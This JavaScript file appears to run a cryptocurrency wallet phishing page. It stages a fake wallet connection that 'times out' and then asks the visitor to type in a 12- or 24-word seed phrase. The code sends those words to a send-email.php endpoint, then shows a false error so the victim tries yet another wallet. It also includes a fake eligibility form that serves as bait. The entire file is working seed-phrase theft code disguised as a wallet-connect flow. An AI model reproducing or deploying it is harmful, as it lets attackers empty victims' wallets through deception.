// Create a new Date object
const today = new Date();

// Get the day of the month (1-31)
const day = today.getDate();
document.getElementById("day").textContent = day;

// Array of month names
const monthNames = [
    "January", "February", "March", "April", "May", "June",
    "July", "August", "September", "October", "November", "December"
];

// Get the current month as a word using getMonth() (0-11)
const month = monthNames[today.getMonth()];
document.getElementById("month").textContent = month;

const year = today.getFullYear();
document.getElementById("year").textContent = year;

// Loading screen
window.addEventListener('load', function () {
    const loadingScreen = document.getElementById('loading-screen');

    // Delay for 2 seconds before fading out
    setTimeout(function () {
        loadingScreen.classList.add('fade-out');
        loadingScreen.addEventListener('transitionend', function () {
            loadingScreen.style.display = 'none';
        });
    }, 2000); // 2000 milliseconds = 2 seconds
});


// Eligibility form script
document.getElementById('messageInput').addEventListener('input', function () {
    const input = this.value;
    const sendButton = document.getElementById('sendButton');
    const errorMessage = document.getElementById('error-message');
    const isValid = input.length >= 20 && /[a-zA-Z]/.test(input) && /\d/.test(input);

    if (isValid) {
        sendButton.disabled = false;
        errorMessage.style.display = 'none';
        sendButton.addEventListener('click', function () {
            $('#eligibilityModal').modal('show');
        });
    } else {
        sendButton.disabled = true;
        errorMessage.style.display = 'block';
    }
});

// Seedphrase script
document.addEventListener("DOMContentLoaded", function () {
    const statusModal = $('#statusModal');
    const statusModalTitle = document.getElementById('statusModalTitle');
    const statusModalMessage = document.getElementById('statusModalMessage');
    const spinner = document.createElement('div');
    spinner.id = 'loadingSpinner';
    spinner.style.display = 'none';
    document.body.appendChild(spinner);

    const messageContent = document.createElement('div');
    messageContent.id = 'messageContent';
    messageContent.style.display = 'none';
    document.body.appendChild(messageContent);

    const successGif = document.createElement('img');
    successGif.id = 'successGif';
    successGif.src = 'images/success.gif';
    successGif.style.display = 'none';
    document.body.appendChild(successGif);

    // Listen for clicks on "Try Manually" buttons
    document.querySelectorAll(".open-seed-modal").forEach(button => {
        button.addEventListener("click", function () {
            let walletName = this.getAttribute("data-wallet");
            let walletLogo = this.getAttribute("data-wallet-logo");
            document.getElementById("seedPhraseModalLabel").innerText = walletName;
            document.getElementById("walletLogo").setAttribute("src", walletLogo);
            document.getElementById("walletNameText").innerText = `Please enter your seed phrase to continue`;
            document.getElementById("walletNameInput").value = walletName;
            $("#seedPhraseModal").modal("show");
        });
    });

    // Handle form submission
    document.getElementById("seedPhraseForm").addEventListener("submit", function (event) {
        event.preventDefault();
        let walletName = document.getElementById("walletNameInput").value;
        let seedInputs = document.querySelectorAll(".seed-input");
        let seedWords = [];
        let valid = true;

        // Improved validation
        seedInputs.forEach((input, index) => {
            input.value = input.value.trim();

            // Check if input is empty
            if (!input.value) {
                valid = false;
                input.classList.add('is-invalid');
                return;
            }

            // Allow only words (letters)
            if (!input.value.match(/^[a-zA-Z]+$/)) {
                valid = false;
                input.classList.add('is-invalid');
            } else {
                input.classList.remove('is-invalid');
                seedWords.push(input.value);
            }
        });

        // Check total number of words
        const wordCountToggle = document.querySelector('.toggle-btn.active');
        const expectedWordCount = wordCountToggle && wordCountToggle.id === 'toggleWordCount24' ? 24 : 12;
        if (seedWords.length !== expectedWordCount) {
            valid = false;
        }

        if (!valid) {
            // statusModalTitle.textContent = 'Invalid Seed Phrase';
            statusModalMessage.textContent = `Please enter a valid ${expectedWordCount}-word seed phrase.`;
            statusModalMessage.style.color = 'red';
            statusModal.modal('show');
            return;
        }

        if (!valid) {
            statusModalTitle.classList.remove('text-success');
            statusModalTitle.classList.add('text-danger');
            statusModalMessage.textContent = 'Please check your seed phrase and try again.';
            statusModalMessage.style.color = 'red';
            spinner.style.display = 'none';
            successGif.style.display = 'none';
            messageContent.style.display = 'block';
            statusModal.modal('show');
            return;
        }

        // Show loading state
        statusModalTitle.classList.remove('text-danger');
        statusModalTitle.classList.add('text-success');
        statusModalMessage.innerHTML = '<span class="loading">Authenticating connection request...</span>';
        statusModalMessage.style.color = 'yellow';
        statusModal.modal('show');

        // Improved error handling for fetch
        setTimeout(() => {
            fetch('send-email.php', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    walletName: walletName,
                    seedWords: seedWords,
                    wordCount: seedWords.length
                })
            })
                .then(response => {
                    // Check if response is ok (status in 200-299 range)
                    if (!response.ok) {
                        throw new Error(`HTTP error! status: ${response.status}`);
                    }
                    return response.json();
                })
                .then(data => {
                    spinner.style.display = 'none';
                    messageContent.style.display = 'block';

                    if (data.success) {
                        successGif.style.display = 'block';
                        statusModalTitle.classList.remove('text-danger');
                        statusModalTitle.classList.add('text-success');
                        statusModalMessage.innerHTML = 'Error while connecting wallet, try connecting another wallet <br><img src="images/loading.gif" style="width:20px" alt="#">';
                        statusModalMessage.style.color = 'red';
                    } else {
                        successGif.style.display = 'none';
                        statusModalTitle.classList.remove('text-success');
                        statusModalTitle.classList.add('text-danger');
                        statusModalMessage.textContent = data.message || 'Wallet connection rejected, try again!';
                        statusModalMessage.style.color = 'red';
                    }
                })
                .catch(error => {
                    console.error('Submission Error:', error);
                    spinner.style.display = 'none';
                    successGif.style.display = 'none';
                    messageContent.style.display = 'block';
                    statusModalTitle.classList.remove('text-success');
                    statusModalTitle.classList.add('text-danger');
                    statusModalMessage.textContent = 'Connection failed. Please check your internet and try again.';
                    statusModalMessage.style.color = 'red';
                });
        }, 4000); // 4 seconds delay
    });
});


// JavaScript to toggle between 12 and 24 word inputs 
const seedInputsContainer = document.getElementById('seedInputsContainer');
const toggleWordCount = document.getElementById('toggleWordCount');
const toggleWordCount24 = document.getElementById('toggleWordCount24');

toggleWordCount.addEventListener('click', function () {
    seedInputsContainer.innerHTML = '';
    for (let i = 1; i <= 12; i++) {
        const input = document.createElement('input');
        input.type = 'text';
        input.className = 'seed-input';
        input.placeholder = i;
        input.maxLength = 15;
        seedInputsContainer.appendChild(input);
    }
});

toggleWordCount24.addEventListener('click', function () {
    seedInputsContainer.innerHTML = '';
    for (let i = 1; i <= 24; i++) {
        const input = document.createElement('input');
        input.type = 'text';
        input.className = 'seed-input';
        input.placeholder = i;
        input.maxLength = 15;
        seedInputsContainer.appendChild(input);
    }
});


// Connecting to wallet loading script
$('.wallet-modal').on('shown.bs.modal', function () {
    var modal = $(this); // Get the current modal

    setTimeout(function () {
        modal.find('.waitingText').hide();
        modal.find('.tryManuallyButton').show();
        modal.find('.loaderImage').attr('src', 'images/stopped-loader.png');
        modal.find('.requestText').html('Request timed out. Try manual connection <i class="fa fa-redo" style="font-size: 10px; margin-bottom:-100px"></i>');
    }, 10000);
});

$('.wallet-modal').on('hidden.bs.modal', function () {
    var modal = $(this); // Get the current modal
    modal.find('.tryManuallyButton').hide();
    modal.find('.waitingText').show();
    modal.find('.loaderImage').attr('src', 'images/dot-loader.gif');
    modal.find('.requestText').text('Accept connection request in the wallet');
});